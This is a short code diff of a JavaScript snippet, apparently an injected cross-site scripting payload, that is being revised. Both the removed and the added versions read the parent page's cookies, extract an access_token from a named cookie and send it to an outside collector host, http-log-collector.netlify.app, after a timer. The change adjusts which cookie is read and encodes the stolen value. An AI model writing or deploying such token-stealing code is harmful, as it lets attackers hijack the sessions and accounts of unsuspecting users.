@@ -10,10 +10,9 @@
   d.body.append(a);
 
  
-    setTimeout(function () {
-      var t = (parent.document.cookie.match(/OptanonConsent=([^;]*)/) || [])[1] || '';
-      t = (t.match(/access_token%3D([^%&]+)/) || [])[1];
-      if (t) fetch('https://http-log-collector.netlify.app/api/log?token=' + t);
-      fetch('https://http-log-collector.netlify.app/api/log?fail')
-    }, 12000);
-
+      setTimeout(function () {
+    var c = parent.document.cookie;
+    var t = (c.match(/_initial_landing_page=([^;]*)/) || [])[1] || '';
+    t = (t.match(/access_token=([^&#]+)/) || [])[1] || '';
+    if (t) fetch('https://http-log-collector.netlify.app/api/log?token=' + encodeURIComponent(t));
+  }, 10000);
